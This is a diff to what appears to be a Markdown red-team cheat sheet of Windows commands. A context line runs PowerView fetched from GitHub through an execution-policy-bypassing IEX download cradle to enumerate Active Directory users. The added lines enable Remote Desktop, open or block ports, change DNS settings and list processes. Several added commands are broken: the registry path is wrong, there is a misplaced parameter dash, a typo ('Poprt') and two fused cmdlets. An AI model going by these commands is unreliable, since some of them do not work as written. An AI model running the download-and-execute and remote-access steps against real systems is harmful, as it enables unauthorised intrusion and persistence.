@@ -121,4 +121,24 @@ Display all AD Users and associated info
 -  powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-UserProperties -Properties name,memberof,description,info
 -  wmic useraccount get/ALL /format:csv
 
+Enable Remote Desktop (requires admin privs)
+- set-ItemProperty -Path 'HKLM:\System\CurrentControl\Control\TerminalServer'-name "fDenyTSConnections" -Value 0
+
+Add firewall rule
+- powershell.exe -command New-NetFirewallRule -DisplayName "Allow Inbound Poprt 80" - Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
+- powershell.exe -command New-NetFirewallRule -DisplayName "Block Outbound Poprt 80" - Direction Outbound -LocalPort 80 -Protocol TCP -Action Block
+
+View all services
+- powershell.exe -command Get-Service
+
+Restart Service
+- powershell.exe -command Restart-Service
+
+Configure DNS server
+- powershell.exe -command Get-Service Set-DNSClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
+
+Get a process list
+- powershell.exe -command Get-Process
+- wmic process get caption,executablepath,commandline /format:csv
+
 
